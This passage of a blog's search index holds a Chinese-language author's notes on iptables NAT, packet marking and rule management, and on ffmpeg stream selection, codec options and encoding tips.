dhcp\u3001pppoe\uff09\u7684\u60c5\u51b5\uff0c\u9759\u6001\u5730\u5740\u5e94\u8be5\u4f7f\u7528 SNAT\u3002</li> </ul> <pre><code># iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o ppp0 -j MASQUERADE\n</code></pre> </li> </ul> <ul> <li> <p>DNAT\uff1a\u7528\u4e8e\u6539\u53d8\u76ee\u7684\u5730\u5740\uff08\u548c\u7aef\u53e3\uff09</p> <ul> <li>\u9002\u7528\u8303\u56f4\uff1anat \u8868\uff0cprerouting, output \u94fe</li> </ul> <pre><code>iptables -t nat -A PREROUTING -i ppp0 -p tcp --dport 8000 -j DNAT --to 192.168.0.6:80\niptables -A fw-open -d 192.168.0.6 -p tcp --dport 80 -j ACCEPT\n</code></pre> </li> </ul> <ul> <li>REDIRECT\uff1a\u5c06\u76ee\u7684\u5730\u5740\u6539\u7f16\u4e3a\u672c\u673a\uff08\u8f93\u5165\u63a5\u53e3\u7684\u4e3b\u5730\u5740\uff0c\u5982\u679c\u4e3a\u672c\u673a\u4ea7\u751f\u7684\u5305\u5219\u4e3a 127.0.0.1\uff09<ul> <li>\u9002\u7528\u8303\u56f4\uff1anat \u8868\uff0cprerouting, output \u94fe</li> </ul> </li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#mark","title":"MARK","text":"<ul> <li> <p>MARK: The MARK target is used to set Netfilter mark values that are associated with specific packets. This target is only valid in the mangle table, and will not work outside there.</p> <pre><code>iptables -t mangle -A PREROUTING -p tcp --dport 22 -j MARK --set-mark 2\n</code></pre> <p>For example, we may set mark 2 on a specific stream of packets, or on all packets from a specific host and then do advanced routing on that host, to decrease or increase the network bandwidth, etc.</p> </li> </ul> <ul> <li> <p>CONNMARK: The CONNMARK target is used to set a mark on a whole connection, much the same way as the MARK target does.</p> <pre><code>iptables -t nat -A PREROUTING -p tcp --dport 80 -j CONNMARK --set-mark 4\n</code></pre> </li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#list-table","title":"list table","text":"<pre><code>iptables -nvL -t &lt;table&gt; #\u9ed8\u8ba4filter\u8868\n#or\niptables-save\n</code></pre>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u4fdd\u5b58\u548c\u6062\u590d","title":"\u4fdd\u5b58\u548c\u6062\u590d","text":"<pre><code>iptables-save &gt; file\niptables-restore &lt;file\n</code></pre>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u6301\u4e45\u5316","title":"\u6301\u4e45\u5316","text":"<p>iptables \u914d\u7f6e\u6301\u4e45\u5316 \u2014 Cloud Atlas 0.1 \u6587\u6863 (cloud-atlas.readthedocs.io)</p>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u91cd\u7f6e-rule","title":"\u91cd\u7f6e rule","text":"<pre><code>iptables -F\niptables -X\n</code></pre>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/03/29/2022-03-29-iptables/#\u53c2\u8003\u8d44\u6599","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>iptables - ArchWiki (archlinux.org)</li> <li>\u6700\u5168\u8d44\u6599\uff1ahttps://www.frozentux.net/iptables-tutorial/iptables-tutorial.html<ul> <li>\u5176\u4e2d\u4ecb\u7ecd\u5404\u4e2a table \u548c chain \u662f\u5982\u4f55\u904d\u5386\u7684\uff1aIptables Tutorial 1.2.2 (frozentux.net)</li> </ul> </li> <li>Iptables REDIRECT vs. DNAT vs. TPROXY \u2013 What I've learned during GSoC \u2013 Here I describe what I've learned during contributing to the netfilter project during my GSoC participation in 2018 hoping that it will help others looking for hard-to find information. (ecklm.com)</li> </ul> <ul> <li>\u672c\u5730\u8fdb\u7a0b\u4ea7\u751f\u7684\u5305\u5728 output chain \u4e4b\u524d\u8fdb\u884c\u4e00\u6b21\u8def\u7531\uff0c\u5f97\u5230 src ip\u3002\u4e4b\u540e\u5982\u679c\u8fdb\u884c\u4e86 dnat\uff0c\u5219\u4f1a\u91cd\u65b0\u8fdb\u884c\u8def\u7531\u3002Linux netfilter Hacking HOWTO: Netfilter Architecture</li> <li>\u5199\u5f97\u5f88\u597d\uff1anetfilter \u6570\u636e\u6d41\u56fe | C0reFast \u8bb0\u4e8b\u672c (ichenfu.com)</li> </ul>","tags":["iptables"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/","title":"ffmpeg","text":"<p>ffmpeg</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u8bb0\u5f55\u4e00\u4e2a\u56f0\u6270\u5f88\u4e45\u7684\u95ee\u9898","title":"\u8bb0\u5f55\u4e00\u4e2a\u56f0\u6270\u5f88\u4e45\u7684\u95ee\u9898","text":"<p>\u6211\u7684\u53f0\u5f0f\u673a\u4f7f\u7528 AMD 5800x\uff0c\u65e0\u8bba\u5728 linux \u4e0b\u548c windows \u4e0b\uff0c\u4f7f\u7528 ffmpeg \u7528 CPU \u7f16\u7801\u89c6\u9891\u65f6\u603b\u662f\u9047\u5230\u201c\u4f2a\u5f71\u201d (artifacts) \u95ee\u9898\u3002\u4f7f\u7528 ffmpeg \u9ed8\u8ba4\u53c2\u6570\uff0c\u7528 libx264 \u7f16\u7801\u4e00\u4e0b\u89c6\u9891\u5c31\u53ef\u4ee5\u590d\u73b0\u3002\u7136\u800c\u540c\u6837\u7684\u89c6\u9891\u5728\u5176\u5b83\u673a\u5668\u4e0a\u5c31\u65e0\u6cd5\u590d\u73b0\u3002</p> <p>artifacts \u627e\u5230\u7684\u6700\u50cf\u76f8\u5173\u5e16\u5b50\u662f\uff1aArtifacts on 4k video encoded with ffmpeg placebo preset - VideoHelp Forum\u3002\u8fd9\u91cc\u63d0\u5230 artifact \u662f\u64ad\u653e\u65f6\u51fa\u73b0\uff0c\u5176\u5b9e\u89c6\u9891\u6587\u4ef6\u7528\u8f6f\u4ef6\u89e3\u7801\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002 \u4f46\u662f\u6211\u7684\u89c6\u9891\u6587\u4ef6\u5bfc\u51fa png\uff0c\u4ecd\u7136\u6709 artifact\uff0c\u4e5f\u5c31\u662f\u8fd8\u662f encoder \u7684\u95ee\u9898\u3002</p> <ul> <li> <p>\u5c1d\u8bd5\u4f7f\u7528 docker \u7248\u7684 ffmpeg\uff0c\u4ecd\u7136\u8fd8\u662f\u6709\u95ee\u9898\u3002</p> <pre><code> alias ffmpegd='docker run -v $(pwd):$(pwd) -w $(pwd) --rm --name ffmpeg-run jrottenberg/ffmpeg '\n</code></pre> </li> </ul> <ul> <li>windows \u4f7f\u7528 handbrake\uff0c\u66f4\u5947\u602a\u4e86\uff0c\u51fa\u73b0\u4e86\u7eff\u8272\u6761\u6761\u3002<ul> <li>mpv \u64ad\u653e\u89c6\u9891\u622a\u56fe\u65f6\uff0c\u4e5f\u4f1a\u51fa\u73b0\u8fd9\u79cd\u7eff\u8272\u7ad6\u6761</li> </ul> </li> <li>\u5e73\u65f6\u7528 sunshine \u4e32\u6d41\u4e5f\u4f1a\u51fa\u73b0\u7f51\u9875\u56fe\u7247\u5b8c\u5168\u7cca\u6210\u9a6c\u8d5b\u514b\u7684\u60c5\u51b5</li> </ul> <p>\u8fd9\u4e9b\u90fd\u8ba9\u6211\u89c9\u5f97\uff0c\u4e0d\u4f1a\u662f CPU \u51fa\u95ee\u9898\u4e86\u5427\u3002</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u57fa\u7840","title":"\u57fa\u7840","text":"<ul> <li>ffmpeg \u8bfb\u53d6\u4efb\u610f\u4e2a input\uff08\u4f7f\u7528-i \u6307\u5b9a\uff09\uff0c\u5199\u5230\u4efb\u610f\u4e2a\u8f93\u51fa\uff08\u901a\u8fc7 plain output url \u6307\u5b9a\uff09</li> <li>\u6bcf\u4e2a\u8f93\u51fa\u6216\u8005\u8f93\u51fa\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u6570\u91cf\u7684\u4e0d\u540c\u7c7b\u578b\u7684\u6d41 (stream)\uff0cstreams \u79cd\u7c7b\u6709<code>video/audio/subtitle/attachment/data</code></li> <li>stream \u7684\u7c7b\u578b\u548c\u6570\u91cf\u53d7\u5bb9\u5668\u683c\u5f0f (container format) \u5f71\u54cd\uff0c\u4ece\u54ea\u4e9b input \u9009\u53d6\u54ea\u4e9b\u6d41\uff0c\u8f93\u51fa\u5230\u54ea\u4e9b output \u7684\u8fc7\u7a0b\uff08stream selection\uff09\u65e2\u53ef\u4ee5\u662f\u81ea\u52a8\u7684\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>-map</code>\u6307\u5b9a\u3002</li> <li>options \u5bf9\u4e0b\u4e00\u4e2a\u6587\u4ef6\u8d77\u4f5c\u7528\uff0c\u53ef\u4ee5\u91cd\u590d\u76f8\u540c\u7684\u9009\u9879</li> <li>\u5f15\u7528 input \u6216\u8005 stream\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ece 0 \u5f00\u59cb\u7684\u7d22\u5f15\u3002\u6bd4\u5982\u7b2c\u4e00\u4e2a\u8f93\u5165\u662f<code>0</code>\uff0c<code>2:3</code>\u00a0\u8868\u793a\u7b2c 3 \u4e2a\u6587\u4ef6\u7684\u7b2c 4 \u4e2a\u6d41</li> <li><code>ffmpeg [\u5168\u5c40\u9009\u9879] [\u8f93\u5165\u9009\u9879] -i [\u8f93\u5165\u6587\u4ef6] [\u8f93\u51fa\u9009\u9879] [\u8f93\u51fa\u6587\u4ef6]</code></li> </ul> <p>\u4e00\u4e9b\u7b80\u5355\u7684\u4f8b\u5b50</p> <p>Convert an input media file to a different format, by re-encoding media streams:</p> <pre><code>ffmpeg -i input.avi output.mp4\n</code></pre> <p>Set the video bitrate of the output file to 64 kbit/s:</p> <pre><code>ffmpeg -i input.avi -b:v 64k -bufsize 64k output.mp4\n</code></pre> <p>Force the frame rate of the output file to 24 fps:</p> <pre><code>ffmpeg -i input.avi -r 24 output.mp4\n</code></pre> <p>Force the frame rate of the input file (valid for raw formats only) to 1 fps and the frame rate of the output file to 24 fps:</p> <pre><code>ffmpeg -r 1 -i input.m2v -r 24 output.mp4\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#ffmpeg-\u6d41\u7a0b","title":"ffmpeg \u6d41\u7a0b","text":"<ul> <li>decode -&gt; filter -&gt; encode</li> <li> <p>\u4f7f\u7528 copy \u9009\u9879\u65f6\uff0c\u53ef\u4ee5\u8df3\u8fc7 decode\u3002Encoded packets are then passed to the decoder (unless streamcopy is selected for the stream, see further for a description).</p> <pre><code> _______              ______________\n|       |            |              |\n| input |  demuxer   | encoded data |   decoder\n| file  | ---------&gt; | packets      | -----+\n|_______|            |______________|      |\n                                           v\n                                       _________\n                                      |         |\n                                      | decoded |\n                                      | frames  |\n                                      |_________|\n ________             ______________       |\n|        |           |              |      |\n| output | &lt;-------- | encoded data | &lt;----+\n| file   |   muxer   | packets      |   encoder\n|________|           |______________|\n</code></pre> </li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#filter","title":"filter","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#simple-filter","title":"simple filter","text":"<ul> <li>\u4e00\u4e2a\u8f93\u5165\uff0c\u4e00\u4e2a\u8f93\u51fa\uff0c\u7c7b\u578b\u76f8\u540c</li> <li>\u5bf9\u6bcf\u4e2a\u6d41\u4f7f\u7528-filter \u9009\u9879\u3002-vf, -af \u662f video \u548c audio \u7684\u522b\u540d</li> </ul> <pre><code>_________                        ______________\n|         |                      |              |\n| decoded |                      | encoded data |\n| frames  |\\                   _ | packets      |\n|_________| \\                  /||______________|\n           \\   __________   /\nsimple     _\\||          | /  encoder\nfiltergraph   | filtered |/\n              | frames   |\n              |__________|\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#complex-filter","title":"Complex filter","text":"<p>Complex filter graphs are those which cannot be described as simply a linear processing chain applied to one stream.</p> <ul> <li>\u591a\u4e2a\u8f93\u5165\u6216\u8f93\u51fa</li> <li>\u4f7f\u7528<code>-filter_complex</code></li> <li>\u9ed8\u8ba4\u662f\u5168\u5c40\u7684\u9009\u9879</li> </ul> <p>\u4f8b\u5b50</p> <p>overlay\uff1a\u5c06\u4e00\u4e2a\u89c6\u9891\u53e0\u52a0\u5230\u53e6\u4e00\u4e2a\u89c6\u9891\u4e0a</p> <p>Define a complex filtergraph, i.e. one with arbitrary number of inputs and/or outputs.  \u201cFiltergraph syntax\u201d section of the ffmpeg-filters manual.</p> <p>Input link labels must refer to input streams using the <code>[file_index:stream_specifier]</code> syntax (i.e. the same as -map uses). If stream_specifier matches multiple streams, the first one will be used. An unlabeled input will be connected to the first unused input stream of the matching type.</p> <p>Output link labels are referred to with -map. Unlabeled outputs are added to the first output file.</p> <pre><code>ffmpeg -i video.mkv -i image.png -filter_complex '[0:v][1:v]overlay[out]' -map\n        '[out]' out.mkv\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-selection","title":"stream selection","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u81ea\u52a8\u9009\u62e9","title":"\u81ea\u52a8\u9009\u62e9","text":"<ul> <li>\u6839\u636e output \u6587\u4ef6\u7684\u7c7b\u578b\uff0c\u51b3\u5b9a\u662f\u5426\u5305\u542b video/audio/subtitles \u7b49\u5404\u79cd\u7c7b\u578b\u7684\u6d41</li> <li>\u6d41\u9009\u62e9\u7684\u5177\u4f53\u89c4\u5219<ul> <li>for video, it is the stream with the highest resolution,</li> <li>for audio, it is the stream with the most channels,</li> <li>for subtitles, it is the first subtitle stream found but there\u2019s a caveat. The output format\u2019s default subtitle encoder can be either text-based or image-based, and only a subtitle stream of the same type will be chosen.</li> </ul> </li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#map-\u9009\u9879","title":"map \u9009\u9879","text":"<p><code>-map [-]input_file_id[:stream_specifier][?][,sync_file_id[:stream_specifier]] | [linklabel] (*output*)</code></p> <ul> <li><code>stream_type[:additional_stream_specifier]</code><ul> <li>\u2019v\u2019 or \u2019V\u2019 for video, \u2019a\u2019 for audio, \u2019s\u2019 for subtitle, \u2019d\u2019 for data, and \u2019t\u2019 for attachments.</li> <li>\u5982\u679c\u4e0d\u6307\u5b9a\u7f16\u53f7\uff0c\u5219\u8868\u793a\u6240\u6709</li> </ul> </li> <li><code>m:key[:value]</code><ul> <li>Matches streams with the metadata tag\u00a0key\u00a0having the specified value. If\u00a0value\u00a0is not given, matches streams that contain the given tag with any value.</li> </ul> </li> </ul> <p>Designate one or more input streams as a source for the output file. Each input stream is identified by the input file index input_file_id and the input stream index input_stream_id within the input file. Both indices start at 0. If specified, sync_file_id:stream_specifier sets which input stream is used as a presentation sync reference.</p> <p>\u4f8b\u5b50</p> <p>For example, if you have two audio streams in the first input file, these streams are identified by \"0:0\" and \"0:1\". You can use <code>-map</code> to select which streams to place in an output file.</p> <p>For example:</p> <pre><code>ffmpeg -i INPUT -map 0:1 out.wav\n</code></pre> <p>will map the input stream in INPUT identified by \"0:1\" to the (single) output stream in out.wav.</p> <p>For example, to select the stream with index 2 from input file a.mov (specified by the identifier \"0:2\"), and stream with index 6 from input b.mov (specified by the identifier \"1:6\"), and copy them to the output file out.mov:</p> <pre><code>ffmpeg -i a.mov -i b.mov -c copy -map 0:2 -map 1:6 out.mov\n</code></pre> <p>To select all video and the third audio stream from an input file:</p> <pre><code>ffmpeg -i INPUT -map 0:v -map 0:a:2 OUTPUT\n</code></pre> <p>To map all the streams except the second audio, use negative mappings</p> <pre><code>ffmpeg -i INPUT -map 0 -map -0:a:1 OUTPUT\n</code></pre> <p>To map the video and audio streams from the first input, and using the trailing <code>?</code>, ignore the audio mapping if no audio streams exist in the first input:</p> <pre><code>ffmpeg -i INPUT -map 0:v -map 0:a? OUTPUT\n</code></pre> <p>To pick the English audio stream:</p> <pre><code>ffmpeg -i INPUT -map 0:m:language:eng OUTPUT\n</code></pre> <p>Note that using this option disables the default mappings for this output file.</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-handling","title":"stream handling","text":"<p>Stream handling is independent of stream selection, with an exception for subtitles described below. Stream handling is set via the\u00a0<code>-codec</code>\u00a0option addressed to streams within a specific\u00a0output\u00a0file. In particular, codec options are applied by ffmpeg after the stream selection process and thus do not influence the latter. If no\u00a0<code>-codec</code>\u00a0option is specified for a stream type, ffmpeg will select the default encoder registered by the output file muxer.</p> <ul> <li>\u5728 stream selection \u4e4b\u540e\u8fdb\u884c</li> <li>\u4f7f\u7528-codec \u6307\u5b9a\u5bf9 output \u4e2d\u6d41\u7684\u5904\u7406\u65b9\u5f0f</li> <li>\u5982\u679c\u6ca1\u6709\u6307\u5b9a-codec\uff0c\u5219\u6309\u7167 output \u6587\u4ef6\u683c\u5f0f\u9009\u62e9\u9ed8\u8ba4\u7684 encoder</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#options","title":"Options","text":"<p>\u6ce8\u610f\uff1affmpeg \u5f88\u591a\u9009\u9879\uff0c\u5176\u5173\u4e8e input/output \u7684\u4f4d\u7f6e\u7684\u4e0d\u540c\uff0c\u4f1a\u4ea7\u751f\u5b8c\u5168\u4e0d\u540c\u7684\u6548\u679c</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#stream-specifier","title":"stream specifier","text":"<p>\u5bf9\u4e8e\u4e00\u4e9b\u9488\u5bf9\u67d0\u4e2a\u6d41\u7684\u9009\u9879\uff08\u5982-codec, -bitrate\uff09\uff0c\u4f7f\u7528 stream specifier \u6765\u6307\u5b9a\u9488\u5bf9\u54ea\u4e2a\u6d41\u3002Some options are applied per-stream, e.g. bitrate or codec. Stream specifiers are used to precisely specify which stream(s) a given option belongs to. \u5982\uff1a</p> <ul> <li>-codec: a:1 ac3\uff0c\u6307\u5b9a\u7b2c2\u4e2aaudio\u6d41\u7684\u7f16\u7801</li> <li>-codec:v copy \u6307\u5b9a\u590d\u5236 video \u6d41\uff08-codec or -codec:\u6307\u5b9a\u590d\u5236\u6240\u6709\u6d41\uff09</li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#main-options","title":"main options","text":"<ul> <li> <p><code>-c[:stream_specifier] codec (input/output,per-stream)</code> Select an encoder (when used before an output file) or a decoder (when used before an input file)  for one or more streams. codec is the name of a decoder/encoder or a special value copy (output only) to indicate that the stream is not to be re-encoded.</p> <pre><code>ffmpeg -i INPUT -map 0 -c:v libx264 -c:a copy OUTPUT\n</code></pre> <p>encodes all video streams with libx264 and copies all audio streams.</p> <p>\u4f5c\u7528\u987a\u5e8f\u4e3a\u540e\u8005\u4f18\u5148</p> <pre><code>ffmpeg -i INPUT -map 0 -c copy -c:v:1 libx264 -c:a:137 libvorbis OUTPUT\n</code></pre> <p>will copy all the streams except the second video, which will be encoded with libx264, and the 138th audio, which will be encoded with libvorbis.</p> </li> </ul> <ul> <li><code>-t duration (*input/output*)</code>   When used as an input option (before <code>-i</code>), limit the duration of data read from the input file.   When used as an output option (before an output url), stop writing the output after its duration reaches duration.</li> </ul> <ul> <li><code>-ss position (*input/output*)</code>     When used as an input option (before <code>-i</code>), seeks in this input file to position.<ul> <li>Note that in most formats it is not possible to seek exactly, so <code>ffmpeg</code> will seek to the closest seek point before position. When transcoding and -accurate_seek is enabled (the default), this extra segment between the seek point and position will be decoded and discarded</li> <li>When doing stream copy or when -noaccurate_seek is used, it will be preserved.   When used as an output option (before an output url), decodes but discards input until the timestamps reach position.</li> </ul> </li> </ul> <ul> <li><code>-to position (*input/output*)</code>   Stop writing the output or reading the input at position.</li> </ul> <ul> <li> <p><code>-filter[:stream_specifier] filtergraph (*output,per-stream*)</code>   Create the filtergraph specified by filtergraph and use it to filter the stream.</p> <p>filtergraph is a description of the filtergraph to apply to the stream, and must have a single input and a single output of the same type of the stream. In the filtergraph, the input is associated to the label <code>in</code>, and the output to the label <code>out</code>. See the ffmpeg-filters manual for more information about the filtergraph syntax.</p> </li> </ul> <ul> <li>Video \u76f8\u5173<ul> <li><code>-vn (input/output)</code>   As an input option, blocks all video streams of a file from being filtered or being automatically selected or mapped for any output. See <code>-discard</code> option to disable streams individually.   As an output option, disables video recording i.e. automatic selection or mapping of any video stream. For full manual control see the <code>-map</code> option.</li> <li><code>-vcodec codec (output)</code></li> <li><code>-vf filtergraph (output)</code>   Create the filtergraph specified by filtergraph and use it to filter the stream.</li> </ul> </li> </ul>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#quick-start","title":"quick start","text":"<p>\u53c2\u8003\uff1aFFmpeg \u89c6\u9891\u5904\u7406\u5165\u95e8\u6559\u7a0b - \u962e\u4e00\u5cf0\u7684\u7f51\u7edc\u65e5\u5fd7 (ruanyifeng.com)</p>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u547d\u4ee4\u683c\u5f0f","title":"\u547d\u4ee4\u683c\u5f0f","text":"<pre><code>$ ffmpeg \\\n[\u5168\u5c40\u53c2\u6570] \\\n[\u8f93\u5165\u6587\u4ef6\u53c2\u6570] \\\n-i [\u8f93\u5165\u6587\u4ef6] \\\n[\u8f93\u51fa\u6587\u4ef6\u53c2\u6570] \\\n[\u8f93\u51fa\u6587\u4ef6]\n</code></pre> <p>\u5982\u4e0b\u9762\u7684\u547d\u4ee4\u5c06 mp4 \u6587\u4ef6\u8f6c\u6210 webm \u6587\u4ef6\uff0c\u8fd9\u4e24\u4e2a\u90fd\u662f\u5bb9\u5668\u683c\u5f0f\u3002\u8f93\u5165\u7684 mp4 \u6587\u4ef6\u7684\u97f3\u9891\u7f16\u7801\u683c\u5f0f\u662f aac\uff0c\u89c6\u9891\u7f16\u7801\u683c\u5f0f\u662f H.264\uff1b\u8f93\u51fa\u7684 webm \u6587\u4ef6\u7684\u89c6\u9891\u7f16\u7801\u683c\u5f0f\u662f VP9\uff0c\u97f3\u9891\u683c\u5f0f\u662f Vorbis\u3002</p> <pre><code>$ ffmpeg \\\n-y \\ # \u5168\u5c40\u53c2\u6570\n-c:a libfdk_aac -c:v libx264 \\ # \u8f93\u5165\u6587\u4ef6\u53c2\u6570\n-i input.mp4 \\ # \u8f93\u5165\u6587\u4ef6\n-c:v libvpx-vp9 -c:a libvorbis \\ # \u8f93\u51fa\u6587\u4ef6\u53c2\u6570\noutput.webm # \u8f93\u51fa\u6587\u4ef6\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5e38\u7528\u53c2\u6570","title":"\u5e38\u7528\u53c2\u6570","text":"<pre><code>-c\uff1a\u6307\u5b9a\u7f16\u7801\u5668\n-c copy\uff1a\u76f4\u63a5\u590d\u5236\uff0c\u4e0d\u7ecf\u8fc7\u91cd\u65b0\u7f16\u7801\uff08\u8fd9\u6837\u6bd4\u8f83\u5feb\uff09\n-c:v\uff1a\u6307\u5b9a\u89c6\u9891\u7f16\u7801\u5668\n-c:a\uff1a\u6307\u5b9a\u97f3\u9891\u7f16\u7801\u5668\n-i\uff1a\u6307\u5b9a\u8f93\u5165\u6587\u4ef6\n-an\uff1a\u53bb\u9664\u97f3\u9891\u6d41\n-vn\uff1a \u53bb\u9664\u89c6\u9891\u6d41\n-preset\uff1a\u6307\u5b9a\u8f93\u51fa\u7684\u89c6\u9891\u8d28\u91cf\uff0c\u4f1a\u5f71\u54cd\u6587\u4ef6\u7684\u751f\u6210\u901f\u5ea6\uff0c\u6709\u4ee5\u4e0b\u51e0\u4e2a\u53ef\u7528\u7684\u503c ultrafast, superfast, veryfast, faster, fast, medium, slow, slower, veryslow\u3002\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u67e5\u770b\u652f\u6301\u7684\u7f16\u7801\u5668","title":"\u67e5\u770b\u652f\u6301\u7684\u7f16\u7801\u5668","text":"<pre><code>~ ffmpeg.exe -encoders |grep av1\n V..... libaom-av1           libaom AV1 (codec av1)\n V....D librav1e             librav1e AV1 (codec av1)\n V..... libsvtav1            SVT-AV1(Scalable Video Technology for AV1) encoder (codec av1)\n\n~ ffmpeg.exe -encoders |grep HEVC\n V..... libx265              libx265 H.265 / HEVC (codec hevc)\n V....D hevc_amf             AMD AMF HEVC encoder (codec hevc)\n V....D hevc_mf              HEVC via MediaFoundation (codec hevc)\n\n~ ffmpeg.exe -encoders |grep h264\nV..... libx264              libx264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (codec h264)\n V..... libx264rgb           libx264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 RGB (codec h264)\n V..... libopenh264          OpenH264 H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (codec h264)\n V....D h264_amf             AMD AMF H.264 Encoder (codec h264)\n V....D h264_mf              H264 via MediaFoundation (codec h264)\n V....D h264_nvenc           NVIDIA NVENC H.264 encoder (codec h264)\n V..... h264_qsv             H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10 (Intel Quick Sync Video acceleration) (codec h264)\n V..... nvenc                NVIDIA NVENC H.264 encoder (codec h264)\n V..... nvenc_h264           NVIDIA NVENC H.264 encoder (codec h264)\n</code></pre>","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5e38\u7528\u547d\u4ee4","title":"\u5e38\u7528\u547d\u4ee4","text":"","tags":["ffmpeg"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2022/05/29/2022-05-29-ffmpeg/#\u5fc3\u5f97-\u5751","title":"\u5fc3\u5f97 (\u5751)","text":"<ul> <li>\u622a\u53d6\u4e00\u6bb5\u89c6\u9891\u65f6\uff0c-ss \u7684\u4f4d\u7f6e\u4e0d\u540c\u6709\u4e0d\u540c\u7684\u6548\u679c\uff0c\u8be6\u89c1 seeking \u7ae0\u8282\u3002\u6bd4\u5982\u4f1a\u5bfc\u81f4\u4f60 seek \u7684\u901f\u5ea6\u975e\u5e38\u6162\uff08\u9700\u8981\u89e3\u7801\uff09\u3002</li> <li>\u6d41\u590d\u5236\u4e0d\u7528\u8f6c\u7801\u662f\u5f88\u597d\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u5404\u79cd\u95ee\u9898\u3002\u6bd4\u5982 seek \u4e0d\u7cbe\u786e\u3001seek \u540e\u89c6\u9891\u548c\u97f3\u9891\u957f\u5ea6\u76f8\u5dee\u51e0\u767e ms\u3002\u56e0\u6b64\u526a\u8f91\u89c6\u9891\u6700\u7a33\u59a5\u8d77\u89c1\u8fd8\u662f\u91cd\u65b0\u8f6c\u7801\u4e00\u4e0b</li> <li>\u8f6c\u7801\u65f6 crf \u4e00\u5b9a\u8981\u9009\u597d\uff0c\u9ed8\u8ba4\u7684\u7801\u7387\u662f\u5f88\u4f4e\u7684 h265 4K<ul> <li>crf 26: 11mbps\uff08B \u7ad9\u8f6c\u6210 h264 \u5c31\u5269 10mb \u4e86\uff0c\u4f46\u5b9e\u9645\u6700\u9ad8\u53ef\u8fbe 18mb\uff09</li> <li>crf 20: 22281kb</li> <li>crf 16: 34894kb</li> </ul> </li> </ul> <p>h265 crf20 \u5bf9 4K 60fps \u7684\u89c6\u9891\uff0c\u53ef\u80fd\u9020\u6210\u8fc7\u9ad8\u7801\u7387\uff0c\u5bfc\u81f4\u6709\u4e9b\u5ba2\u6237\u7aef\u64ad\u653e\u5361\u987f\u3002\u6700\u597d\u5148\u6d4b\u8bd5\u4e0d\u540c 